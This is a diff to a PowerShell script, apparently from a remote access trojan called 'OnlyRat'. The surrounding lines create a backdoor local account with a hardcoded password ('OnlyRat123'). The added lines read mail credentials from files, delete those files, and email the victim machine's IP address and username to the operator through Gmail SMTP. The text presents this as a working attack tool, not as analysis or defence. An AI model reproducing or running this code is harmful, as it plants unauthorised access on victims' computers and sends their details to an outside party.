@@ -38,6 +38,19 @@ $uname = "onlyrat"
 $pword = (ConvertTo-SecureString "OnlyRat123" -AsPlainText -Force)
 create_account -uname $uname -pword $pword
 
+# get credentials
+$email = Get-Content email.txt
+$pass = Get-Content pass.txt
+del email.txt
+del pass.txt
+
+# smtp process
+$ip = (Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias Ethernet).IPAddress | Out-String; $subject = "OnlyRat: $env:UserName ip"
+$smtp = New-Object System.Net.Mail.SmtpClient("smtp.gmail.com", "587")
+$smtp.EnableSSL = $true
+$smtp.Credentials = New-Object System.Net.NetworkCredential($email, $pass)
+$smtp.Send($email, $email, $subject, $ip)
+
 # goto temp, make working directory
 mkdir $path
 cd $path
